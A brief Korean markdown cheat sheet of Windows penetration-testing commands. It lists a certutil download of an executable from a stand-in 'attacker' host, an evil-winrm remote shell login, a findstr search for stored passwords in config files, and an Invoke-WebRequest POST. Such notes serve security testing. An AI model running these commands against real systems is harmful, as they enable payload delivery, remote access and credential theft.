# Windows

Windows 환경 점검 내용을 정리한 문서입니다.

## certutil

```bash
certutil -urlcache -split -f http://attacker/file.exe
```

## evil-winrm

```bash
evil-winrm -i target -u user -p password
```

## find_string

```powershell
findstr /s /i "password" *.txt *.xml *.ini *.config
```

## Invoke-WebRequest

```powershell
Invoke-WebRequest -uri "http://target" -Method Post
```
